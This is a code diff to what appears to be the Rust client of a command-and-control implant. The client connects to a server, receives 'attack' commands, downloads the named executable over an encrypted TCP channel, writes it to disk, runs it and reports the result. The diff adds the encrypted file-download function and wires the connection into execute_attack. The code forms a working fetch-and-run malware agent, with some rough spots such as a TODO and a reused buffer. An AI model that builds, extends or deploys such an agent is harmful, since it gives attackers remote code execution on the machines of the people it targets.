@@ -1,7 +1,7 @@
 mod connexion;
 
 // use std::borrow::Borrow;
-use std::io::{self, Write};
+use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::thread;
 use std::str;
@@ -155,6 +155,43 @@ fn receive_encrypted_string_from_server(
     }
 }
 
+fn receive_encrypted_file_from_server(mut stream: TcpStream,
+    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
+    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
+    size_expected: usize,
+) -> Vec<u8> {
+    // TODO
+
+    let mut buffer = vec![0u8; size_expected];
+    let mut data = Vec::new();
+
+    println!("[+] start receiving file from server");
+
+    match stream.read_exact(&mut buffer) {
+        Ok(()) => {
+            println!("[+] start receiving file from server");
+            data.extend_from_slice(&buffer[..size_expected]);
+        }
+        Err(e) => {
+            println!("[!] Error reading file from server: {:?}", e);
+        }
+    }
+
+    println!("[+] file received from server");
+    // let mut buffer = vec![0u8; data.len() + 16];
+    match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer){
+        Ok(decrypted_data) => { 
+            decrypted_data.to_vec()
+        }
+
+        Err(err) => {
+            eprintln!("Error decrypting data: {:?}", err);
+            String::new().as_bytes().to_vec()
+
+        }
+    }
+}
+
 
 
 fn check_and_request_executable(
@@ -164,6 +201,7 @@ fn check_and_request_executable(
                                     receiver: &mpsc::Receiver<Vec<u8>>,
                                     symetric_key: &GenericArray<u8, typenum::consts::U16>,
                                     iv: &GenericArray<u8, typenum::consts::U16>,
+                                    connexion: TcpStream
                                     ) -> io::Result<()> {
 
     #[cfg(client_os = "windows")]
@@ -181,8 +219,19 @@ fn check_and_request_executable(
         send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
         println!("\t\t[+] Request sent");
 
-        let data_file = receive_encrypted_data_from_server(receiver, symetric_key.clone(), iv.clone());
-        println!("\t\t[+] data received");
+        
+        let file_size = receive_encrypted_string_from_server(receiver, symetric_key.clone(), iv.clone());
+        println!("\t\t[+] file size received : {:?}", file_size);
+
+
+        println!("\t\t[+] sending back file size");
+        send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());
+
+
+        println!("\t\t[+] waiting for file data");
+        let data_file = receive_encrypted_file_from_server(connexion, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap());
+        println!("\t\t[+] file data received");
+
 
         let mut file = File::create(&executable_path)?;
         file.write_all(&data_file)?;
@@ -202,10 +251,11 @@ fn execute_attack(
     receiver: &mpsc::Receiver<Vec<u8>>,
     symetric_key: &GenericArray<u8, typenum::consts::U16>,
     iv: &GenericArray<u8, typenum::consts::U16>,
+    connexion: TcpStream
 ) -> io::Result<()> {
     let executable_dir = "./actions";
 
-    check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv)?;
+    check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv, connexion)?;
 
     #[cfg(client_os = "windows")]
     let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
@@ -222,6 +272,7 @@ fn main() -> io::Result<()> {
     // Connexion
     let connexion: TcpStream = connexion::connexion()?;
     let connexion2: TcpStream = connexion.try_clone()?;
+    let connexion3: TcpStream = connexion.try_clone()?;
 
     // thread emission
     let (sender, rx) = mpsc::channel::<Vec<u8>>();
@@ -312,7 +363,7 @@ fn main() -> io::Result<()> {
                 let id_attack = json_attack.id;
 
                 // println!("Received command: {}", message);
-                match execute_attack(&json_attack.attack, &sender, &receiver, &symetric_key, &iv) {
+                match execute_attack(&json_attack.attack, &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
                     Ok(_) => {
                         let response = format!("{{\"status\":\"success\",\"id\":\"{}\"}}", id_attack);
                         send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
